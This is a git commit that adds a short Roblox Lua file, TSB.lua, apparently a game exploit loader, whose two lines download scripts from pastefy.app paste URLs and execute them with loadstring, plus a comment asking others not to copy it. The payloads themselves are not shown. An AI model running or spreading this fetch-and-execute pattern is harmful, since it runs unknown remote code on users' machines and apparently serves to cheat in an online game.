7d0a849cce87cf7176d46e362367569356b93b70
COOLXPLO <ankitstudent030@gmail.com>
2025-12-18 12:57:15 +0530

    Add TSB.lua with two loadstring scripts

---
+++ TSB.lua
@@ -0,0 +1,7 @@
+-- First script
+loadstring(game:HttpGet("https://pastefy.app/M8YnntYX/raw"))()
+
+-- Second script 
+loadstring(game:HttpGet("https://pastefy.app/DaCbcPjg/raw"))()
+
+--Dont skid pls brother
